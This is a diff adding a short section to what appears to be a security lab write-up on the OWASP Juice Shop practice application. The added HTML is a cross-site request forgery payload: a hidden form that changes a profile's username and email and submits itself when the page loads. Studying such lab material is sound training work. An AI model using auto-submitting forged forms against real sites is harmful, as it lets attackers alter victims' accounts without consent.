@@ -464,6 +464,20 @@ If your modified HTML doesn't show up on the site, try to restart apache2.
 
 * index.html
 
+
+``` html
+<form action="http://localhost:3000/profile" method="POST">
+  <input type="hidden" name="username" value="compsec"/>
+  <input type="hidden" name="email" value="admin@juice-sh.op"/>
+</form>
+
+<body onload="document.forms[0].submit()">
+```
+
+
+
+
+
 ---
 **Brute forcing**
 
